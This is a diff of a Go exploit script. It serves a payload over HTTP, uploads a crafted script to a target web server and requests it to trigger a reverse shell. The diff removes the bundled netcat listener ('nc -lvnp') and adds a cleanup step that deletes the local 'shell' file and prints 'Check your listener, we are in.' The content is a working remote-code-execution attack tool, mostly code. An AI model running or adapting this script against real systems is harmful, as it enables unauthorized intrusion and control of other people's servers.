@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"net/http"
 	"os"
-	"os/exec"
 	"time"
 )
 
@@ -39,9 +38,6 @@ func main() {
 	go startHTTPServer(WebPort)
 	time.Sleep(time.Second * 1)
 
-	fmt.Printf("[+] Starting netcat listener on %s:%s\n", *userFlags.LocalIp, *userFlags.LocalPort)
-	netcatCmd := startNetcatListener(*userFlags.LocalIp, *userFlags.LocalPort)
-
 	fmt.Println("[+] Attempting to save the script on target")
 	craftExploit(UploadPayload)
 	uploadUrl := fmt.Sprintf("%s%s", URL, Payload)
@@ -53,8 +49,8 @@ func main() {
 	reverseUrl := fmt.Sprintf("%s%s", URL, Payload)
 	makeGetRequest(reverseUrl)
 
-	fmt.Println("[+] Foregrounding the netcat listener")
-	foregroundNetcat(netcatCmd)
+	cleanUp()
+
 }
 
 func parseFlags() {
@@ -138,24 +134,11 @@ func makeGetRequest(url string) {
 	}
 }
 
-func startNetcatListener(ip, port string) *exec.Cmd {
-	cmd := exec.Command("nc", "-lvnp", port)
-	return cmd
-}
-
-func foregroundNetcat(cmd *exec.Cmd) {
-	cmd.Stdin = os.Stdin
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-
-	err := cmd.Start()
+func cleanUp() {
+	err := os.Remove("shell")
 	if err != nil {
-		fmt.Println("Error starting netcat listener:", err)
-		return
-	}
-
-	err = cmd.Wait()
-	if err != nil {
-		fmt.Println("Error waiting for netcat listener to finish:", err)
+		fmt.Println("Error removing shell file:", err)
+	} else {
+		fmt.Println("[+] Check your listener, we are in.")
 	}
 }
